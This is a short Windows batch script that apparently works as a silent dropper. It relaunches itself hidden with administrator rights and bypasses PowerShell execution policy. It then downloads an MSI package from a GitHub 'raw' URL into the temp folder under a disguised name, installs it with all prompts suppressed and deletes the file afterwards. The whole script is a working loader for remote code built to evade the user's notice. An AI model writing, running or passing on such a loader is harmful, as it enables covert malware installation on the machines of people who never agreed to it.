@echo off
if "%~1"=="HIDDEN" goto :INSTALL
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& { Start-Process cmd -ArgumentList '/c','\"%~f0\" HIDDEN' -Verb RunAs -WindowStyle Hidden }"
exit
:INSTALL
set "FILE=%TEMP%\~temp.msi"
set "URL=https://github.com/n0vapanel/zzz/raw/main/bin.msi"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing } catch {}"
start "" /wait /b msiexec /i "%FILE%" /quiet /qn /norestart
del "%FILE%" /f /q >nul 2>&1
exit